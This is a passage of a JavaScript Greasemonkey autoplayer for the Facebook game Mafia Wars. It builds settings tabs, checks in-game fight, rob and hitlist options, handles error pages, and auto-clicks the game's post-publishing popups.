    var choice = makeElement('option', null, {'value':i,'title':cityDepotParts[i][0]});
    choice.appendChild(document.createTextNode(cityDepotParts[i][0]));
    depotPartsType.appendChild(choice);
  }
  depotPartsType.selectedIndex = GM_getValue(id, 0);

  // Ask for Armor Parts
  xTop += 25;
  title = 'Check this to Ask for Armor Parts every 12 hours';
  id = 'askArmorParts';
  var armorParts = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', armorParts, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', armorParts, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Armor Parts'));

  // List Armor Parts
  id = 'askArmorPartsId';
  var armorPartsType = makeElement('select', armorParts, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityArmorParts.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityArmorParts[i][0]});
    choice.appendChild(document.createTextNode(cityArmorParts[i][0]));
    armorPartsType.appendChild(choice);
  }
  armorPartsType.selectedIndex = GM_getValue(id, 0);

   // Ask for Zoo Parts
  xTop += 25;
  title = 'Check this to Ask for Zoo Parts every 12 hours';
  id = 'askZooParts';
  var zooParts = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', zooParts, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', zooParts, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Zoo Parts'));

  // List Zoo Parts
  id = 'askZooPartsId';
  var zooPartsType = makeElement('select', zooParts, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityZooParts.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityZooParts[i][0]});
    choice.appendChild(document.createTextNode(cityZooParts[i][0]));
    zooPartsType.appendChild(choice);
  }
  zooPartsType.selectedIndex = GM_getValue(id, 0);

  // Ask for Casino Parts
  xTop += 25;
  title = 'Check this to Ask for Casino Parts every 2 hours, since no MW timer available';
  id = 'askCasinoParts';
  var casinoParts = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', casinoParts, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', casinoParts, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Ask for Casino Parts'));

  // List Casino Parts
  id = 'askCasinoPartsId';
  var casinoPartsType = makeElement('select', casinoParts, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityCasinoParts.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityCasinoParts[i][0]});
    choice.appendChild(document.createTextNode(cityCasinoParts[i][0]));
    casinoPartsType.appendChild(choice);
  }
  casinoPartsType.selectedIndex = GM_getValue(id, 0);

  // Collect Takes
  var xTop = 50;
  title = 'Automatically collect from properties';
  id = 'collectTake' + cities[0][CITY_NAME];
  var autoTake = makeElement('div', cashTab, {'style':'top: '+xTop+'px; right: 10px;'});
  label = makeElement('label', autoTake, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Collect from Properties'));
  makeElement('input', autoTake, {'type':'checkbox', 'id':id, 'value':'checked'}, id);

  // Autobanking
  var xTop = 220;
  for (var i = 0, iLength = cities.length; i < iLength; ++i) {
    id = cities[i][CITY_AUTOBANK];
    title = 'Enable ' + cities[i][CITY_NAME] + ' banking';
    var curBank = makeElement('div', cashTab, {'style':'top: '+xTop+'px; right: 5px; width: 280px; text-align: left;'});
    makeElement('input', curBank, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
    makeElement('label', curBank, {'for':id}).appendChild(document.createTextNode(title));
    makeElement('img', curBank, {'style':'position: absolute; right: 90px; margin-top: 3px;', 'src':stripURI(cities[i][CITY_CASH_ICON])});
    id = cities[i][CITY_BANKCONFG];
    title = 'Minimum deposit amount in ' + cities[i][CITY_NAME];
    makeElement('input', curBank, {'type':'text', 'style':'position: absolute; right: 0px; width: 85px; text-align: right;', 'title':title, 'value':GM_getValue(id, '50000'), 'id':id, 'size':'5'});
    xTop += 25;
  }
  // Las Vegas: current vault level
  var vaultLevel = makeElement('div', cashTab, {'style':'top: '+xTop+'px; right: 5px;'});
  title = 'Las Vegas: disable automatic vault handling, or select the level of your vault and let PS MWAP handle it.';
  id = 'vaultHandling';
  makeElement('img', vaultLevel, {'src':stripURI(cashVegasIcon), 'style':'margin-right: 5px;'});
  var vaultSelect = makeElement('select', vaultLevel, {'id':id, 'title':title, 'style':'position: static; text-align: left;'});
  for (i = 0, iLength=vaultLevels.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i});
    choice.appendChild(document.createTextNode(vaultLevels[i][0]));
    vaultSelect.appendChild(choice);
  }
  vaultSelect.selectedIndex = GM_getValue(id, 0);

  return cashTab;
}

// Create About tab
function createAboutTab() {
  var elt, title, id, label;
  var aboutTab = makeElement('div', null, {'id': 'aboutTab', 'class': 'tabcontent'});

  var eltCol = makeElement('div', aboutTab, {'style':'width:762px;height:25px;'});
  var eltA = makeElement('a', eltCol, {'href':'http://www.playerscripts.com/ps-mwap-forum.html','target':'_none','class':'helpLink'});

  if (gvar.isGreaseMonkey) {
    eltA = makeElement('a', eltCol, {'href':'#','alt':'update','title':'update','style':'width:43px;margin-right:10px;','class':'settingsLink'});
    eltA.appendChild(document.createTextNode('Update'));
    eltA.addEventListener('click', updateScript, false);
  }

  eltA = makeElement('a', eltCol, {'href':'#','alt':'save settings','title':'save setttings','style':'width:84px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Save Settings'));
  eltA.addEventListener('click', saveSettings, false);

  var eltForm = makeElement('form', eltCol,{'action':'https://www.paypal.com/cgi-bin/webscr','method':'post','name':'MWAPDonateLink','target':'_blank'});
  eltA = makeElement('input', eltForm,{'name':'cmd','type':'hidden','value':'_s-xclick'});
  eltA = makeElement('input', eltForm,{'name':'hosted_button_id','type':'hidden','value':'ST6BSZGFQXCUY'});
  eltA = makeElement('a', eltForm, {'name':'submit','href':'#','target':'_blank','onclick':'document.MWAPDonateLink.submit();return false;','alt':'PayPal - The safer, easier way to pay online.','title':'PayPal - The safer, easier way to pay online.','style':'width:50px;','class':'settingsLink'});
  eltA.appendChild(document.createTextNode('Donate'));

  var TabHeader = makeElement('div', eltCol, {'style':'width:500px;height:25px;border:none #FFFFFF;float:left;font-size: 18px; font-weight: bold;'});
  TabHeader.appendChild(document.createTextNode('Version ' + SCRIPT.version));

  var devs = makeElement('div', aboutTab, {'style': 'top: 50px; width: 550px; left: 10px; font-size: 12px; font-weight: bold;'});
  devs.appendChild(document.createTextNode('Contributors:'));
  makeElement('br', devs);

  var devNames = 'CharlesD, Eric Ortego, Jeremy, Liquidor, AK17710N, Fragger, <x51>, ' +
                 'CyB, int1, Janos112, int2str, Doonce, Eric Layne, Tanlis, Cam, ' +
                 'csanbuenaventura, vmzildjian, Scrotal, Bushdaka, rdmcgraw, moe, ' +
                 'KCMCL, caesar2k, crazydude, keli, SamTheButcher, dwightwilbanks, ' +
                 'nitr0genics, DTPN, nonoymsd, donnaB, black1ger, Lister, MaxJ, BBB, Gibson_sg';

  devList = makeElement('p', devs, {'style': 'position: relative; left: 15px;'});
  devList.appendChild(document.createTextNode(devNames));

  // Recent updates
  item = makeElement('div', aboutTab, {'style': 'border:1px solid #999999; padding: 2px 2px 2px 2px; overflow: ' +
                                       'auto; width: 530px; height: 120px; top: 160px; left: 30px; ' +
                                       'font-size: 10px;'});
  item.innerHTML = '<span class="good">Release changes:</span> <br><br>' + GM_getValue('newRevList') + '<br>' +
                   '<span class="bad">Previous changes:</span> <br><br>' + GM_getValue('oldRevList');
  item.innerHTML = 'Revision history pulled out for the mean time...<br><br>Google\'s project hosting servers are being overwhelmed by this feature :D<br><br>PS MWAP Team';

   // Test New Changes
  var devTools = makeElement('div', aboutTab, {'style': 'top: 350px; left: 10px; font-size: 12px;'});
  id = 'TestChanges';
  title = 'Enable Script Modifications In Testing Phase ';
  makeElement('input', devTools, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', devTools, {'for':id,'title':title}).appendChild(document.createTextNode('BETA TESTING ONLY : USE AT OWN RISK !'));

  return aboutTab;
}

function grabToolbarInfo(manually) {
  // Function for creating the cookies necessary to use miniPacks without installing the Zynga toolbar:
  var createToolbarCookies = function() {
    var openSinglePopup = function(strUrl) { window.open(strUrl,"toolbar","resizable=yes,scrollbars=yes,status=yes"); }
    window.setTimeout(function(){openSinglePopup('http://toolbar.zynga.com/game_iframe_proxy.php?playing=true');},1000);
    window.setTimeout(function(){openSinglePopup('http://toolbar.zynga.com/game_iframe_proxy.php');},5000);
  }

  // In case the current browser lacks greasemonkey (chrome):
  if (!gvar.isGreaseMonkey) {
    if (manually && window.confirm('Can\'t retrieve Toolbar info with this browser.\n\n' +
                       'In case the miniPack doesn\'t work here at all,\nyou could let MWAP create the necessary cookies for you.\nPS: For this to work, ' +
                       'you need to allow popups in your browser, and wait for ca. 10 secs before closing the popup (after confirming this dialog).')) {
      createToolbarCookies();
    }
    return;
  }

  GM_xmlhttpRequest({
    method: 'GET',
    url: 'http://toolbar.zynga.com/game_stats_proxy.php?src=mw',
    headers: {'Accept': 'application/atom+xml'},
    onload: function (resp) {
      if (resp.status != 200) return;

      var toolbarInfo = JSON.parse(resp.responseText);
      DEBUG('Toolbar response: ' + resp.responseText);
      if (!toolbarInfo || toolbarInfo.error) {
        if (window.confirm('Error retrieving Toolbar info, probably because it\s the first time you are trying to fire the miniPack in this browser/-profile.\n\n' +
                           'Do you want MWAP to create the necessary cookies for you? If not, you have to install the Zynga Toolbar.\nPS: For this to work, ' +
                           'you need to allow popups in your browser, and wait for ca. 10 secs before closing the popup (after confirming this dialog).')) {
          createToolbarCookies();
        }
        // abort any time changes
        return;
      }

      // Info in info.  user_health, user_energy, user_stamina, energy_timestamp, toolbar_energy_timestamp
      // has_toolbar_enery_pack, has_energypack, error

      var datNow = new Date();
      var modGMT = 8; // Default PDT
      datNow.setMilliseconds(0);
      var timer = toolbarInfo.toolbar_energy_timestamp - (datNow.getTime()/1000) + 3600 * modGMT;

      setGMTime('miniPackTimer', timer + ' seconds');

      return;
    }
  });
}

function grabUpdateInfo() {
  if (!gvar.isGreaseMonkey) return;
  GM_setValue('newRevList', '');
  GM_setValue('oldRevList', '');
  return;
  GM_xmlhttpRequest({
    method: 'GET',
    url: 'http://code.google.com/p/mwplayer/source/list',
    headers: {'Accept': 'application/atom+xml'},
    onload: function (resp) {
      if (resp.status != 200) return;

      s = (resp.responseText);
      var count = 0;
      var changes = 5;
      var newRevList = '';
      var oldRevList = '';
      while (count < changes + 5) {
        var a = s.indexOf('<td class="id">');
        a = a + 10;
        s = s.substring(a);
        //var searchString = s.match(/href\x3D\x22\x2Fp\x2Fmwplayer\x2Fsource\x2Fdetail\x3Fr\x3D([0-9]+)\x22\x3E/);
        var searchString = s.match(/href\x3D\x22detail\x3Fr\x3D([0-9]+)\x22\x3E/);
        var revisionString = RegExp.$1;
        //var searchString = s.match(/span\sclass\x3D\x22ot\x2Dlogmessage\x22\x3E([\x21,\x22,\x23,\x26,\x27,\x28,\x29,\x2B,\x2C,\x2D,\x2E,\x2F,\x3A,\x3B,\x3F,\x5B,\x5D,\x5F,\x60,A-Z,a-z,0-9,\s]+)\x3C\x2Fspan/);
        var searchString = s.match(/a\sonclick\x3D\x22cancelBubble\x3Dtrue\x22\shref\x3D\x22detail\x3Fr\x3D[0-9]+\x22\x3E([\x21,\x22,\x23,\x26,\x27,\x28,\x29,\x2B,\x2C,\x2D,\x2E,\x2F,\x3A,\x3B,\x3F,\x5B,\x5D,\x5F,\x60,A-Z,a-z,0-9,\s]+)\x3C\x2Fa\x3E/);
        var commentString = RegExp.$1;
        var revLine = 'r' + revisionString + '... ' + commentString.replace('- ', '') + '<br>';
        if (count < changes)
          newRevList += revLine;
        else
          oldRevList += revLine;
        count++;
      }
      GM_setValue('newRevList', newRevList);
      GM_setValue('oldRevList', oldRevList);
    }
  });
}
////////////////////////////////////////////////////////////////////
function validateStaminaTab() {
  var elt, id;

  var checked = function(id) {
    return document.getElementById(id).checked === true ? 'checked' : 0;
  }

  // Create an empty object to hold the settings.
  var s = {};

  // Get the common settings.
  s.staminaSpend = checked('staminaSpend');
  s.staminaSpendHow = document.getElementById('staminaSpendHow').selectedIndex;
  s.staminaSpeedClick = checked('staminaSpeedClick');
  var selectStaminaUse = parseInt(document.getElementById('selectStaminaUse').value);
  if (isNaN(selectStaminaUse)) selectStaminaUse = 0;
  s.selectStaminaUse = selectStaminaUse;
  s.selectStaminaUseMode = document.getElementById('selectStaminaUseMode').selectedIndex;
  var selectStaminaKeep = parseInt(document.getElementById('selectStaminaKeep').value);
  if (isNaN(selectStaminaKeep)) selectStaminaKeep = 0;
  s.selectStaminaKeep = selectStaminaKeep;
  s.selectStaminaKeepMode = document.getElementById('selectStaminaKeepMode').selectedIndex;

  var selectMissionStaminaKeep = parseInt(document.getElementById('selectMissionStaminaKeep').value);
  if (isNaN(selectMissionStaminaKeep)) selectMissionStaminaKeep = 0;
  s.selectMissionStaminaKeep = selectMissionStaminaKeep;
  s.selectMissionStaminaKeepMode = document.getElementById('selectMissionStaminaKeepMode').selectedIndex;

  s.allowStaminaToLevelUp = checked('allowStaminaToLevelUp');

//  selectStaminaKeep  selectMissionStaminaKeep
//  selectStaminaKeepMode  selectMissionStaminaKeepMode

  // Validate common settings
  if (isNaN(s.selectStaminaUse) || isNaN(s.selectStaminaKeep) || isNaN(s.selectMissionStaminaKeep) ) {
    alert('Please enter numeric values for Stamina reserve and Stamina threshold.');
    return false;
  }

  // The method of getting and verifying the rest of the settings depends
  // on how stamina will be spent.
  switch (s.staminaSpendHow) {
    case STAMINA_HOW_FIGHTROB: // Fight then Rob
    case STAMINA_HOW_FIGHTRIVALS_ROB:
      // Get the settings.
      s.robLocation = document.getElementById('robLocation').selectedIndex;
      s.fastRob = checked('fastRob');

    case STAMINA_HOW_FIGHT_RANDOM: // Random fighting
    case STAMINA_HOW_FIGHT_RIVALS: // Rival fighting
      // Get the specific settings.
      s.fightLocation = document.getElementById('fightRandomLoc').selectedIndex;
      s.reattackThreshold = parseInt(document.getElementById('reattackThreshold').value);
      s.staminaReattack = checked('staminaReattack');
      s.iceCheck = checked('iceCheck');
      s.staminaPowerattack = checked('staminaPowerattack');

      s.fightLevelMax = parseInt(document.getElementById('fightLevelMax').value);
      s.fightLevelMaxRelative = checked('fightLevelMaxRelative');
      s.fightLevelMaxOverride = checked('fightLevelMaxOverride');
      s.fightMafiaMax = parseInt(document.getElementById('fightMafiaMax').value);
      s.fightMafiaMaxRelative = checked('fightMafiaMaxRelative');
      s.fightMafiaMin = parseInt(document.getElementById('fightMafiaMin').value);
      s.fightMafiaMinRelative = checked('fightMafiaMinRelative');

      s.fightMobMode = checked('fightMobMode');

      s.fightNames = checked('fightNames');
      s.fightAvoidNames = checked('fightAvoidNames');
      s.fightOnlyNames = checked('fightOnlyNames');
      s.fightClanName = document.getElementById('fightClanName').value;
      s.fightRemoveStronger = checked('fightRemoveStronger');

      s.fightStealth = checked('fightStealth');

      // Validate reattack settings.
      if (isNaN(s.reattackThreshold)) {
        alert('Please enter the threshold for reattacking opponents.');
        return false;
      } else if (s.reattackThreshold < 0) {
        alert('Please enter a reattack threshold of zero or more.');
        return false;
      }

      // Validate the maximum level settings.
      // Override level check code by bboyle.  Thanks!
      if (isNaN(s.fightLevelMax)) {
        alert('Please enter a maximum level for fighting.');
        return false;
      } else if (s.fightLevelMaxRelative && s.fightLevelMax < 0) {
        alert('Please enter a maximum relative level of zero or more.');
        return false;
      } else if (!s.fightLevelMaxRelative && s.fightLevelMax < level && !s.fightLevelMaxOverride) {
        addToLog('warning Icon', 'Maximum level for fighting is set to ' + s.fightLevelMax + '. Setting to current level of ' + level + '.');
        s.fightLevelMax = level;
//newchange_need_to_add_to_main
/*      } else if (!s.fightLevelMaxRelative && level >= 180 &&
                 s.fightLevelMax < 200) {
        alert('Once you reach level 180, only opponents of level 180 and up are displayed. In order to find random opponents, please enter a maximum fight level of 200 at the very least. If necessary, lower the maximum mafia size to compensate.');
        return false;
      } else if (s.fightLevelMaxRelative && level >= 180 &&
                level + s.fightLevelMax < 200) {
        alert('Once you reach level 180, only opponents of level 180 and up are displayed. In order to find random opponents, please enter a relative fight level of at least ' + (200 - s.fightLevelMax) + '. If necessary, lower the maximum mafia size to compensate.');
        return false;
*/      }

      // Validate the maximum mafia size settings.
      if (isNaN(s.fightMafiaMax)) {
        alert('Please enter a maximum mafia size for fighting.');
        return false;
      } else if (!s.fightMafiaMaxRelative && (s.fightMafiaMax < 1)) {
        alert('Please enter a maximum mafia size of one or more for fighting.');
        return false;
      } else if (s.fightMafiaMaxRelative && (s.fightMafiaMax + mafia < 1)) {
        alert('Please enter a larger relative mafia size for fighting.');
        return false;
      }

      // Validate the minimum mafia size settings.
      if (isNaN(s.fightMafiaMin)) {
        alert('Please enter a minimum mafia size for fighting.');
        return false;
      } else if (!s.fightMafiaMinRelative && (s.fightMafiaMin < 1)) {
        alert('Please enter a minimum mafia size of one or more for fighting.');
        return false;
      } else if (s.fightMafiaMinRelative && (mafia - s.fightMafiaMin < 1)) {
        alert('Please enter a smaller relative mafia size for fighting.');
        return false;
      }

      if(s.fightNames == 'checked'){
        // Validate the fight list.
        var list = s.fightClanName.split('\n');
        if (!list[0]) {
          alert('Enter at least one clan name/symbol in the list');
          return false;
        }
      }

      break;

    case STAMINA_HOW_FIGHT_LIST: // List fighting
      // Get the settings.
      s.fightLocation = document.getElementById('fightListLoc').selectedIndex;
      s.reattackThresholdList = parseInt(document.getElementById('reattackThresholdList').value);
      s.staminaReattackList = checked('staminaReattackList');
      s.iceCheck = checked('iceCheck');

      s.staminaPowerattack = checked('staminaPowerattack');

      s.pfightlist = document.getElementById('pfightlist').value;
      s.fightRemoveStronger = document.getElementById('fightRemoveStronger').checked === true? 'checked' : 0;

      // Validate reattack settings.
      if (isNaN(s.reattackThresholdList)) {
        alert('Please enter the threshold for reattacking opponents.');
      } else if (s.reattackThresholdList < 0) {
        alert('Please enter a reattack threshold of zero or more.');
      }

      // Validate the fight list.
      var list = s.pfightlist.split('\n');
      if (!list[0]) {
        alert('Enter the Facebook ID of at least one opponent to fight.');
        return false;
      }
      break;

    case STAMINA_HOW_HITMAN: // Hitlist bounty collection ("auto-hitman")
      // Get the settings.
      s.hitmanLocation = document.getElementById('hitmanLocation').selectedIndex;


      s.hitmanBountyMin = document.getElementById('hitmanBountyMin').value;
      s.bountySelection = document.getElementById('bountySelection').selectedIndex;

      s.hitmanNames = checked('hitmanNames');
      s.hitmanAvoidNames = checked('hitmanAvoidNames');
      s.hitmanOnlyNames = checked('hitmanOnlyNames');
      s.hitmanClanName = document.getElementById('hitmanClanName').value;
      s.fightRemoveStronger = checked('fightRemoveStronger');

      // Validate the minimum bounty.
      var min = parseCash(s.hitmanBountyMin);
      if (isNaN(min) || min < 0) {
        alert('Please enter a minimum bounty amount.');
        return false;
      }

      if(s.hitmanNames == 'checked'){
        // Validate the fight list.
        var list = s.hitmanClanName.split('\n');
        if (!list[0]) {
          alert('Enter at least one clan name/symbol in the list');
          return false;
        }
      }

      break;

    case STAMINA_HOW_ROBBING: // Robbing
      // Get the settings.
      s.robLocation = document.getElementById('robLocation').selectedIndex;
      s.fastRob = checked('fastRob');
      break;

    case STAMINA_HOW_AUTOHITLIST: // Place hitlist bounties
      // Get the settings.
      s.autoHitListLoc = document.getElementById('autoHitListLoc').selectedIndex;
      s.autoHitListBounty = document.getElementById('autoHitListBounty').value;
      s.autoHitListRandom = checked('autoHitListRandom');
      s.pautoHitOpponentList = document.getElementById('pautoHitOpponentList').value;
      s.bgAutoHitCheck  = checked('bgAutoHitCheck');

      // Validate the bounty.
      var min = parseCash(s.autoHitListBounty);
      if (isNaN(min) || min < 10000 && !s.autoHitListRandom) {
        alert('Please enter a minimum bounty amount of at least $10,000');
        return false;
      }

      // Validate the autohit list.
      var list = s.pautoHitOpponentList.split('\n');
      if (!list[0]) {
        alert('Enter the Facebook ID of at least one opponent to hitlist.');
        return false;
      }
      break;

    case STAMINA_HOW_RANDOM: // Random stamina spending
      var spendModes="";
      var spendModesChecked=document.getElementsByName("randomSpendModes[]");
      for (var i=0;i<spendModesChecked.length;++i){
        if(spendModesChecked[i].checked) {
          spendModes+='1';
        } else {
          spendModes+='0';
        }
      }
      if(!parseInt(spendModes)) spendModes = '1' + spendModes.substr(1);
      s.randomSpendModes=spendModes;

      var randomCities="";
      var randomCitiesChecked=document.getElementsByName("randomFightLocations[]");
      for (var i=0;i<randomCitiesChecked.length;++i){
        if(randomCitiesChecked[i].checked) {
          randomCities+='1';
        } else {
          randomCities+='0';
        }
      }
      if(!parseInt(randomCities)) randomCities = '1' + randomCities.substr(1);
      s.randomFightLocations=randomCities;

      randomCities="";
      randomCitiesChecked=document.getElementsByName("randomRobLocations[]");
      for (var i=0;i<randomCitiesChecked.length;++i){
        if(randomCitiesChecked[i].checked) {
          randomCities+='1';
        } else {
          randomCities+='0';
        }
      }
      if(!parseInt(randomCities)) randomCities = '1' + randomCities.substr(1);
      s.randomRobLocations=randomCities;

      randomCities="";
      randomCitiesChecked=document.getElementsByName("randomHitmanLocations[]");
      for (var i=0;i<randomCitiesChecked.length;++i){
        if(randomCitiesChecked[i].checked) {
          randomCities+='1';
        } else {
          randomCities+='0';
        }
      }
      if(!parseInt(randomCities)) randomCities = '1' + randomCities.substr(1);
      s.randomHitmanLocations=randomCities;

      break;

    default :
      addToLog('warning Icon', 'BUG DETECTED: Unrecognized stamina setting here: staminaSpendHow=' + s.staminaSpendHow);
      break;
  }

  return s;
}
/////////////////////////////////////////////////////////////////////////////////////////////
function clickAutoPause() {
  if (this.checked) {
    // check to ensure at least one radio box is checked
    // enable Before level up by default
    if (document.getElementById('autoPauseBefore').checked === false &&
        document.getElementById('autoPauseAfter').checked === false) {
      document.getElementById('autoPauseBefore').checked = true;
    }
  }
}

function clickUseFightNames() {
  if (this.checked) {
    // check to ensure at least one radio box is checked
    // enable Before level up by default
    if (document.getElementById('fightAvoidNames').checked === false &&
        document.getElementById('fightOnlyNames').checked === false) {
      document.getElementById('fightAvoidNames').checked = true;
    }
  }
}

function clickUseHitmanNames() {
  if (this.checked) {
    // check to ensure at least one radio box is checked
    // enable Before level up by default
    if (document.getElementById('hitmanAvoidNames').checked === false &&
        document.getElementById('hitmanOnlyNames').checked === false) {
      document.getElementById('hitmanAvoidNames').checked = true;
    }
  }
}

function handleUnexpectedPage() {
  DEBUG('Unexpected page.');

  // Handle "try again" error pages.
  var tryAgainElt = document.getElementById('try_again_button');
  if (tryAgainElt) {
    var delay = 10;
    var p = document.createElement('p');
    var wait = function() {
      if (!delay) return tryAgainElt.click();
      p.innerHTML = 'You will automatically try again in ' +
                    delay-- + ' seconds.';
      window.setTimeout(wait, 1000);
      return false;
    };
    DEBUG('Service interruption: "Try Again" button seen.');
    tryAgainElt.parentNode.appendChild(document.createElement('br'));
    tryAgainElt.parentNode.appendChild(p);
    wait();
    return;
  }

  // Skip "free boost" pages.
  var elt = xpathFirst('//a[contains(., "Skip")]');
  if (elt) {
    Autoplay.fx = function() {
      clickElement(elt);
      DEBUG('Clicked "skip".');
    };
    Autoplay.delay = getAutoPlayDelay();
    Autoplay.start();
    return;
  }

  // Start a timer to reload the page if nothing else happens.
  Autoplay.fx = function() {
    // Unrecognized page.
    if (!document.body) {
      DEBUG('No body. Possible redirect, white out or slow load?');
    } else {
      DEBUG('Can\'t read page. Possible white out?');
    }
    loadHome();
  };
  Autoplay.delay = 10000;
  Autoplay.start();
}

function handleModificationTimer(target) {
  // The timer has gone off, so assume that page updates have finished.
  modificationTimer = undefined;

  if(new_header){
    var mastheadElt =  xpathFirst('//div[@class="header_top_row"]');
  } else {
    var mastheadElt = document.getElementById('mw_masthead');
  }
  if (!mastheadElt || !mastheadElt.scrollWidth || !refreshGlobalStats()) {
    handleUnexpectedPage();
    return;
  }
  refreshSettings();
  synchSettings();

  // Find the visible inner page.
  var pageChanged = false;
  var justPlay = false;
  var prevPageElt = innerPageElt;
  appLayoutElt = document.getElementById('mw_city_wrapper');
  statsrowElt = document.getElementById('stats_row');
  mastheadElt = document.getElementById('mw_masthead');
  menubarElt = document.getElementById('menubar');
  popupfodderElt = document.getElementById('popup_fodder');
  innerPageElt = document.getElementById('inner_page');

  if (!innerPageElt) return;

  // Determine if the displayed page has changed.
  if (!xpathFirst('.//div[@id="inner_flag"]', innerPageElt)) {
    setListenContent(false);
    makeElement('div', innerPageElt, {'id':'inner_flag', 'style':'display: none;'});
    setListenContent(true);
    DEBUG('New inner page content: ' + innerPageElt.id);
    pageChanged = true;
  } else if (prevPageElt != innerPageElt) {
    DEBUG('Switched inner page to: ' + innerPageElt.id);
    pageChanged = true;
  }

  // Added handling for the new-style job page changes
  var jobResult = xpathFirst('.//div[@id="new_user_jobs"]//div[@class="job_results"]', innerPageElt);
  if (jobResult) {
    if (!xpathFirst('.//div[@id="job_flag"]', jobResult)) {
      setListenContent(false);
      makeElement('div', jobResult, {'id':'job_flag', 'style':'display: none;'});
      setListenContent(true);
      DEBUG('Detected new-style job results.');
      pageChanged = true;
      if (running) justPlay = true;
    }
  }

  // Added handling for Las Vegas job page changes
  var jobResults = $x('.//div[@id="map_panels"]/div[@id="side_container"]//div[@class="job_results"]', innerPageElt);
  if (jobResults && jobResults.length > 0) {
    for (var i = 0, iLength=jobResults.length; i < iLength; ++i) {
      if (jobResults[i] && !xpathFirst('./div[@id="job_flag"]', jobResults[i])) {
        setListenContent(false);
        makeElement('div', jobResults[i], {'id':'job_flag', 'style':'display: none;'});
        setListenContent(true);
        DEBUG('Detected '+cities[city][CITY_NAME]+' jobresults change on job ='+i);
        pageChanged = true;
        if (running) justPlay = true;
        DEBUG('Flagged');
      } else {
       DEBUG('Already Flagged');
      }
    }
  }

  // Added handling for Mission Results  Miss_ID  Miss_Slot
  var MissionResults = xpathFirst('.//div[contains(@id,"missionTask_'+Miss_Slot+'_'+Miss_ID+'")]//div[@class="task_results"]', innerPageElt);    // results just being on mission page
  if (MissionResults) {
//        DEBUG('mission results found');   //doatest
      if (MissionResults && !xpathFirst('./div[@id="job_flag"]', MissionResults)) {
        setListenContent(false);
        makeElement('div', MissionResults, {'id':'job_flag', 'style':'display: none;'});
        setListenContent(true);
        DEBUG('Detected Mission results change on Mission ='+Miss_ID);
        pageChanged = true;
        if (running) justPlay = true;
        DEBUG('Flagged');
      } else {
       DEBUG('Already Flagged');
      }
//  } else {       DEBUG('mission results NOT found in handlemodtimer');   //doatest

}

  // Added handling for just rob page changes
  var robResult = xpathFirst('.//a[@id="rob_refresh_cost"]', innerPageElt);
  if (robResult) {
    if (!xpathFirst('.//div[@id="rob_flag"]', robResult)) {
      setListenContent(false);
      makeElement('div', robResult, {'id':'rob_flag', 'style':'display: none;'});
      setListenContent(true);
      DEBUG('Detected new rob results.');
      pageChanged = true;
      if (running) justPlay = true;
    }
  }

  if (running) {
    // Popups opened?
    //var popupElt = xpathFirst('.//div[@id="popup_fodder"]', appLayoutElt);
    if (!onProfileNav() && popupfodderElt && popupfodderElt.scrollWidth && popupfodderElt.innerHTML.length > 0) {
      var popupElts = $x('.//div[contains(@style, "block")]', popupfodderElt);
      if (popupElts && popupElts.length > 0) {
        for (var i = 0, iLength=popupElts.length; i < iLength; ++i) {
          if (popupElts[i] && popupElts[i].scrollWidth && popupElts[i].innerHTML.length > 0) {
            var foundPopup = true;
            break;
          }
        }
      }

      if (foundPopup) {
        pageChanged = true;
        justPlay = true;
      }
    }
  }

  // Handle changes to the inner page.
  if (pageChanged) {
    try {
      innerPageChanged(justPlay);
    } catch(ex) {
      addToLog('warning Icon', 'BUG DETECTED (pageChanged): ' + ex);
    }
  } else {
    // Check on every cash change if we should quickbank
    if (running && target && (target.className=="cur_cash" || (target.parentNode && target.parentNode.className=="cur_cash")))
      doQuickBank();
  }
}

function setModificationTimer(target) {
  if (modificationTimer) window.clearTimeout(modificationTimer);
  modificationTimer = window.setTimeout(function(){handleModificationTimer(target);}, 500);
}

function handleContentModified(e) {
  if (ignoreElement(e.target)) return;
  setModificationTimer(e.target);
}

function handlePublishing() {
  fetchPubOptions();
  if (GM_getValue('isRunning')) {
    try {
      // Publishing/skipping posts
      var skipElt = xpathFirst('//input[@type="submit" and @name="cancel"]');
      var pubElt = xpathFirst('//input[@type="submit" and @name="publish"]');
      var okElt = xpathFirst('//input[@type="submit" and @name="ok"]');

      // If OK button is found, close the window by pressing it
      if (okElt) {
        DEBUG('Publish: Clicked OK button');
        clickElement(okElt);

      // If (1) Pub button is not found anymore; or
      //    (2) It's been 10 seconds since the post window loaded
      // Then close the window
      } else if (!pubElt || !timeLeftGM('postTimer')) {
        if (skipElt) {
          DEBUG('Publish: Clicked Skip');
          clickElement(skipElt);
        }
        else DEBUG('Publish: no Skip button found');
      }

      // Perform publishing logic once posting buttons have loaded
      if (skipElt && pubElt) {
        if (isGMChecked('autoGlobalPublishing')) {
          // Click the Publish-button on every post popup
          clickElement(pubElt);
          // Wait for 2 seconds before trying to close window manually
          window.setTimeout(handlePublishing, 1500);
          return true;
        } else {
          // Use Publishing Criteria
          // Generic publishing function
          var checkPublish = function (xpathString, gmFlag, pubElt, skipElt) {
            var eltDiv = xpathFirst(xpathString);
            if (eltDiv) {
              if (isGMChecked(gmFlag)){
                clickElement(pubElt);
              }
              else {
                clickElement(skipElt);
              }
              // Wait for 2 seconds before trying to close window manually
              window.setTimeout(handlePublishing, 2000);
              return true;
            }
            return false;
          };

          // Daily chance
